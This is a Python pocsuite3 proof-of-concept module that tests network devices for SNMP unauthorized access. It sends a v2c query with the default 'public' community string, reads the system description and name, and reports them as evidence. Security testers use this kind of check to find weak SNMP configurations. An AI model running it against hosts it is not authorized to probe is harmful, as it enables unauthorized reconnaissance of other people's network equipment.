#!/usr/bin/env python
# coding: utf-8
from pysnmp.hlapi import getCmd, SnmpEngine, CommunityData, UdpTransportTarget, ContextData, ObjectType, ObjectIdentity
from urllib.parse import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2019-1-8'
    createDate = '2019-1-8'
    updateDate = '2019-1-8'
    references = ['', ]
    name = 'SNMP unauthorized access'
    appPowerLink = ''
    appName = 'All'
    appVersion = 'v2'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    category = POC_CATEGORY.EXPLOITS.REMOTE
    install_requires = ['pysnmp']
    desc = '''
    SNMP Community默认设置，攻击者可通过该漏洞泄露网络设备的敏感信息。
    '''

    def _verify(self):
        def test_snmp(target, port=161, community='public'):
            try:
                errorIndication, errorStatus, errorIndex, varBinds = next(
                    getCmd(SnmpEngine(),
                           # mpModel -> 0:v1,1:v2c
                           CommunityData(community, mpModel=1),
                           UdpTransportTarget(
                               (target, int(port)), timeout=1, retries=1),
                           ContextData(),
                           ObjectType(ObjectIdentity(
                               'SNMPv2-MIB', 'sysDescr', 0)),
                           ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysName', 0)))
                )
                if errorIndication:
                    return (False, errorIndication)
                elif errorStatus:
                    msg = '%s at %s' % (errorStatus.prettyPrint(
                    ), errorIndex and varBinds[int(errorIndex) - 1][0] or '?')
                    return (False, msg)
                else:
                    result = []
                    for varBind in varBinds:
                        result.append(' = '.join(
                            [x.prettyPrint() for x in varBind]))
                    return (True, result)
            except Exception as e:
                # raise
                return (False, str(e))

        result = {}
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [161]
        for port in ports:
            try:
                status, msg = test_snmp(pr.hostname, port)
                if status:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(
                        pr.hostname, port)
                    result['extra'] = {}
                    result['extra']['evidence'] = msg
                    break
            except:
                # raise
                pass

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
